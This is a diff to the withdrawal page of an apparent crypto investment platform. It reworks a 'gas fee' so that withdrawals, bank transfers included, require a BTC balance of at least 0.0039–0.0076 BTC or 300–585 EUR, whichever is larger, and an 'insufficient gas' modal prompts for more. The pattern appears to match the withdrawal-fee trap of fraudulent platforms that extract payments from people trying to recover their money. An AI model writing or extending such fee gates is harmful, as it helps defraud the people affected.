@@ -2339,7 +2339,10 @@
         currentUserEmail: '',
         lastOtpRequestTime: 0,
         OTP_COOLDOWN_PERIOD: 60000,
-        pendingWithdrawalData: null
+        pendingWithdrawalData: null,
+        // NEW: EUR to BTC conversion rate for gas fee calculation
+        eurToBtcRate: 0,
+        btcToEurRate: 50000 // Default conversion rate (1 BTC = 50000 EUR)
     };
 
     // Enhanced fetch with CORS handling and error management
@@ -2396,6 +2399,9 @@
             await loadWithdrawalHistory();
             await checkKYCStatus();
             setupBtcConversion();
+            
+            // NEW: Initialize EUR to BTC conversion rate
+            await initializeEurToBtcRate();
             
             // Initialize OTP system
             initializeOtpSystem();
@@ -3068,7 +3074,57 @@
             console.error('Error checking KYC status:', error);
         }
     }
+
+    /* ============================================= */
+    /* NEW: EUR to BTC Conversion for Gas Fees */
+    /* ============================================= */
     
+    // Initialize EUR to BTC conversion rate
+    async function initializeEurToBtcRate() {
+        try {
+            // Get BTC to EUR rate from CoinGecko
+            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur');
+            if (response.ok) {
+                const data = await response.json();
+                AppState.btcToEurRate = data.bitcoin.eur || 50000; // Default fallback
+                AppState.eurToBtcRate = 1 / AppState.btcToEurRate;
+            } else {
+                // Use default rates if API fails
+                AppState.btcToEurRate = 50000;
+                AppState.eurToBtcRate = 0.00002;
+            }
+        } catch (error) {
+            console.error('Error fetching EUR conversion rate:', error);
+            // Use default rates if API fails
+            AppState.btcToEurRate = 50000;
+            AppState.eurToBtcRate = 0.00002;
+        }
+    }
+    
+    // NEW: Calculate required gas fee in BTC and EUR, then take the larger amount
+    function getRequiredGasFee(withdrawalAmount) {
+        // Fixed BTC amounts for different withdrawal ranges
+        const btcFeeSmall = 0.0039; // For withdrawals $9,999 and below
+        const btcFeeLarge = 0.0076; // For withdrawals $10,000 and above
+        
+        // Fixed EUR amounts for different withdrawal ranges
+        const eurFeeSmall = 300; // 300 EUR for withdrawals $9,999 and below
+        const eurFeeLarge = 585; // 585 EUR for withdrawals $10,000 and above
+        
+        // Convert EUR fees to BTC using current exchange rate
+        const eurFeeSmallInBtc = eurFeeSmall * AppState.eurToBtcRate;
+        const eurFeeLargeInBtc = eurFeeLarge * AppState.eurToBtcRate;
+        
+        // Determine which fee range to use based on withdrawal amount
+        if (withdrawalAmount < 10000) {
+            // For withdrawals $9,999 and below: take the larger of 0.0039 BTC or 300 EUR (converted to BTC)
+            return Math.max(btcFeeSmall, eurFeeSmallInBtc);
+        } else {
+            // For withdrawals $10,000 and above: take the larger of 0.0076 BTC or 585 EUR (converted to BTC)
+            return Math.max(btcFeeLarge, eurFeeLargeInBtc);
+        }
+    }
+
     /* ============================================= */
     /* Bitcoin Conversion & Fee Calculation */
     /* ============================================= */
@@ -3109,18 +3165,14 @@
         });
     }
     
-    // Gas Fee System
-    function getRequiredGasFee(withdrawalAmount) {
-        return withdrawalAmount < 10000 ? 0.0039 : 0.0076;
-    }
-    
+    // Update gas fee display based on withdrawal amount
     function updateGasFeeDisplay(withdrawalAmount = null) {
         let feeText;
         if (withdrawalAmount === null) {
             feeText = "0.0039 BTC for withdrawals < $10,000 | 0.0076 BTC for withdrawals ≥ $10,000";
         } else {
             const fee = getRequiredGasFee(withdrawalAmount);
-            feeText = `${fee} BTC`;
+            feeText = `${fee.toFixed(4)} BTC`;
         }
         
         // Update all fee display elements
@@ -3340,9 +3392,9 @@
                     const additionalNeeded = requiredGasFee - mainBalanceBTC;
                     
                     document.getElementById('user-gas-balance').textContent = `${mainBalanceBTC.toFixed(8)} BTC`;
-                    document.getElementById('minimum-gas-required').textContent = `${requiredGasFee} BTC`;
+                    document.getElementById('minimum-gas-required').textContent = `${requiredGasFee.toFixed(4)} BTC`;
                     document.getElementById('additional-gas-needed').textContent = `${additionalNeeded.toFixed(8)} BTC`;
-                    document.getElementById('current-gas-fee').textContent = `${requiredGasFee} BTC`;
+                    document.getElementById('current-gas-fee').textContent = `${requiredGasFee.toFixed(4)} BTC`;
                     
                     openModal('insufficient-gas-modal');
                 }
@@ -3397,7 +3449,7 @@
         document.getElementById('modal-withdraw-usd-amount').textContent = `$${usdAmount.toFixed(2)}`;
         document.getElementById('modal-withdraw-btc-amount').textContent = btcAmount;
         document.getElementById('modal-btc-wallet-address').textContent = walletAddress;
-        document.getElementById('modal-btc-withdraw-fee').textContent = `${gasFee} BTC`;
+        document.getElementById('modal-btc-withdraw-fee').textContent = `${gasFee.toFixed(4)} BTC`;
         
         // Show balance source information
         let sourceInfo = '';
@@ -3422,7 +3474,7 @@
         document.getElementById('modal-bank-amount').textContent = `$${usdAmount.toFixed(2)}`;
         document.getElementById('modal-bank-name').textContent = bankName;
         document.getElementById('modal-account-holder').textContent = accountHolder;
-        document.getElementById('modal-bank-fee').textContent = `${gasFee} BTC`;
+        document.getElementById('modal-bank-fee').textContent = `${gasFee.toFixed(4)} BTC`;
         
         document.getElementById('modal-account-number').textContent = `****${accountNumber.slice(-4)}`;
         document.getElementById('modal-routing-number').textContent = `*****${routingNumber.slice(-4)}`;
@@ -3797,6 +3849,13 @@
     
     // Set current year in footer
     document.getElementById('current-year').textContent = new Date().getFullYear();
+    
+    // Helper function for notifications (if not already defined)
+    function showNotification(type, title, message, duration = 3000) {
+        // This is a simplified notification system - you might want to implement a proper one
+        console.log(`[${type.toUpperCase()}] ${title}: ${message}`);
+        // You can add actual UI notification code here if needed
+    }
 </script>
 </body>
 </html>
